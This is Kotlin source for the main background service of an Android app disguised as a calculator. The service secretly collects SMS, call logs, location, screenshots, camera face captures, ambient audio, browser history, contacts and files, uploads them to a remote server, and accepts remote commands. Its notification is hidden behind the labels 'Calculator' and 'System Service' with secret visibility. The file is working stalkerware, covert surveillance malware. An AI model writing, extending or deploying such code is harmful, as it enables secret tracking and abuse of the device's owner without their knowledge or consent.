package com.stealthcalc.monitoring.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.collector.AppUsageCollector
import com.stealthcalc.monitoring.collector.BatteryCollector
import com.stealthcalc.monitoring.collector.AmbientSoundCollector
import com.stealthcalc.monitoring.collector.BrowserHistoryCollector
import com.stealthcalc.monitoring.collector.CalendarCollector
import com.stealthcalc.monitoring.collector.CallLogCollector
import com.stealthcalc.monitoring.collector.ContactFrequencyCollector
import com.stealthcalc.monitoring.collector.DataUsageCollector
import com.stealthcalc.monitoring.collector.DeviceInfoCollector
import com.stealthcalc.monitoring.collector.DeviceSecurityCollector
import com.stealthcalc.monitoring.collector.GeofenceCollector
import com.stealthcalc.monitoring.collector.AppPermissionsCollector
import com.stealthcalc.monitoring.collector.ContactChangeCollector
import com.stealthcalc.monitoring.collector.InstalledAppsCollector
import com.stealthcalc.monitoring.collector.WifiAlertCollector
import com.stealthcalc.monitoring.collector.SensorCollector
import com.stealthcalc.monitoring.collector.StepCountCollector
import com.stealthcalc.monitoring.collector.FaceCaptureCollector
import com.stealthcalc.monitoring.collector.FileSyncCollector
import com.stealthcalc.monitoring.collector.LocationCollector
import com.stealthcalc.monitoring.collector.MediaUploadCollector
import com.stealthcalc.monitoring.collector.ScreenshotCollector
import com.stealthcalc.monitoring.collector.MediaChangeCollector
import com.stealthcalc.monitoring.collector.NetworkCollector
import com.stealthcalc.monitoring.collector.ScreenStateCollector
import com.stealthcalc.monitoring.collector.SimChangeCollector
import com.stealthcalc.monitoring.collector.SmsCollector
import com.stealthcalc.monitoring.collector.WifiHistoryCollector
import android.content.SharedPreferences
import com.stealthcalc.core.di.EncryptedPrefs
import com.stealthcalc.monitoring.service.RemoteCommandHandler
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.AgentApiClient
import android.content.Intent as AndroidIntent
import android.content.IntentFilter
import android.os.BatteryManager
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class AgentService : LifecycleService() {

    companion object {
        private const val CHANNEL_ID = "agent_channel"
        private const val NOTIFICATION_ID = 9002
        private const val COLLECT_INTERVAL_NORMAL_MS = 60_000L
        private const val COLLECT_INTERVAL_LOW_BATTERY_MS = 180_000L
        private const val UPLOAD_INTERVAL_MS = 120_000L
        private const val LOW_BATTERY_THRESHOLD = 20

        var isRunning = false
            private set

        fun start(context: Context) {
            context.startForegroundService(Intent(context, AgentService::class.java))
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, AgentService::class.java))
        }
    }

    @Inject lateinit var repository: MonitoringRepository
    @Inject lateinit var appUsageCollector: AppUsageCollector
    @Inject lateinit var batteryCollector: BatteryCollector
    @Inject lateinit var screenStateCollector: ScreenStateCollector
    @Inject lateinit var networkCollector: NetworkCollector
    @Inject lateinit var locationCollector: LocationCollector
    @Inject lateinit var callLogCollector: CallLogCollector
    @Inject lateinit var smsCollector: SmsCollector
    @Inject lateinit var mediaChangeCollector: MediaChangeCollector
    @Inject lateinit var deviceSecurityCollector: DeviceSecurityCollector
    @Inject lateinit var mediaUploadCollector: MediaUploadCollector
    @Inject lateinit var fileSyncCollector: FileSyncCollector
    @Inject lateinit var screenshotCollector: ScreenshotCollector
    @Inject lateinit var faceCaptureCollector: FaceCaptureCollector
    @Inject lateinit var wifiHistoryCollector: WifiHistoryCollector
    @Inject lateinit var browserHistoryCollector: BrowserHistoryCollector
    @Inject lateinit var simChangeCollector: SimChangeCollector
    @Inject lateinit var deviceInfoCollector: DeviceInfoCollector
    @Inject lateinit var dataUsageCollector: DataUsageCollector
    @Inject lateinit var calendarCollector: CalendarCollector
    @Inject lateinit var geofenceCollector: GeofenceCollector
    @Inject lateinit var installedAppsCollector: InstalledAppsCollector
    @Inject lateinit var ambientSoundCollector: AmbientSoundCollector
    @Inject lateinit var contactFrequencyCollector: ContactFrequencyCollector
    @Inject lateinit var stepCountCollector: StepCountCollector
    @Inject lateinit var sensorCollector: SensorCollector
    @Inject lateinit var appPermissionsCollector: AppPermissionsCollector
    @Inject lateinit var wifiAlertCollector: WifiAlertCollector
    @Inject lateinit var contactChangeCollector: ContactChangeCollector
    @Inject lateinit var remoteCommandHandler: RemoteCommandHandler
    @Inject lateinit var apiClient: AgentApiClient
    @Inject @EncryptedPrefs lateinit var prefs: SharedPreferences

    private var collectJob: Job? = null
    private var uploadJob: Job? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        runCatching {
            createNotificationChannel()
            startForeground(
                NOTIFICATION_ID,
                buildNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        }.onFailure { e ->
            AppLogger.log(this, "[agent]", "Failed to promote to foreground: ${e.message}")
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        isRunning = true
        startCollectors()
        startUploadLoop()
        remoteCommandHandler.startListening()
        AppLogger.log(this, "[agent]", "Agent service started")
        return START_STICKY
    }

    private fun startCollectors() {
        screenStateCollector.start()
        networkCollector.start()
        mediaChangeCollector.start()
        deviceSecurityCollector.start()
        faceCaptureCollector.start()
        simChangeCollector.start()
        stepCountCollector.start()
        sensorCollector.start()
        contactChangeCollector.start()

        collectJob?.cancel()
        collectJob = lifecycleScope.launch {
            while (isActive) {
                if (!isWithinSchedule()) {
                    delay(getSmartInterval())
                    continue
                }
                runCatching {
                    appUsageCollector.collect()
                    batteryCollector.collect()
                    locationCollector.collect()
                    networkCollector.collectSnapshot()
                    callLogCollector.collect()
                    smsCollector.collect()
                    mediaUploadCollector.collect()
                    fileSyncCollector.collect()
                    screenshotCollector.captureScreenshot()
                    wifiHistoryCollector.collect()
                    browserHistoryCollector.collect()
                    deviceInfoCollector.collect()
                    dataUsageCollector.collect()
                    calendarCollector.collect()
                    simChangeCollector.collect()
                    geofenceCollector.collect()
                    installedAppsCollector.collect()
                    ambientSoundCollector.collect()
                    contactFrequencyCollector.collect()
                    appPermissionsCollector.collect()
                    wifiAlertCollector.collect()
                }.onFailure { e ->
                    AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                }
                delay(getSmartInterval())
            }
        }
    }

    private fun startUploadLoop() {
        uploadJob?.cancel()
        uploadJob = lifecycleScope.launch {
            while (isActive) {
                delay(UPLOAD_INTERVAL_MS)
                runCatching {
                    val unsent = repository.getUnsent()
                    if (unsent.isNotEmpty() && repository.isPaired) {
                        val success = apiClient.uploadBatch(unsent)
                        if (success) {
                            repository.markUploaded(unsent.map { it.id })
                            repository.setLastSync(System.currentTimeMillis())
                        }
                    }
                    repository.pruneOldEvents()
                }.onFailure { e ->
                    AppLogger.log(this@AgentService, "[agent]", "Upload error: ${e.message}")
                }
            }
        }
    }

    override fun onDestroy() {
        isRunning = false
        collectJob?.cancel()
        uploadJob?.cancel()
        screenStateCollector.stop()
        networkCollector.stop()
        mediaChangeCollector.stop()
        deviceSecurityCollector.stop()
        faceCaptureCollector.stop()
        screenshotCollector.release()
        simChangeCollector.stop()
        stepCountCollector.stop()
        sensorCollector.stop()
        contactChangeCollector.stop()
        remoteCommandHandler.stopListening()
        AppLogger.log(this, "[agent]", "Agent service stopped")
        super.onDestroy()
    }

    private fun getSmartInterval(): Long {
        val batteryIntent = registerReceiver(null, IntentFilter(AndroidIntent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        val percent = if (scale > 0) (level * 100) / scale else 100
        return if (percent <= LOW_BATTERY_THRESHOLD) COLLECT_INTERVAL_LOW_BATTERY_MS
        else COLLECT_INTERVAL_NORMAL_MS
    }

    private fun isWithinSchedule(): Boolean {
        val enabled = prefs.getBoolean("schedule_enabled", false)
        if (!enabled) return true
        val startHour = prefs.getInt("schedule_start_hour", 0)
        val endHour = prefs.getInt("schedule_end_hour", 24)
        val daysStr = prefs.getString("schedule_days", "1,2,3,4,5,6,7") ?: "1,2,3,4,5,6,7"
        val days = daysStr.split(",").mapNotNull { it.trim().toIntOrNull() }.toSet()
        val cal = java.util.Calendar.getInstance()
        val dayOfWeek = cal.get(java.util.Calendar.DAY_OF_WEEK)
        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
        return dayOfWeek in days && hour in startHour until endHour
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System Service",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            setShowBadge(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
            description = "Required for background operation"
        }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentTitle("Calculator")
            .setContentText("Running")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
}
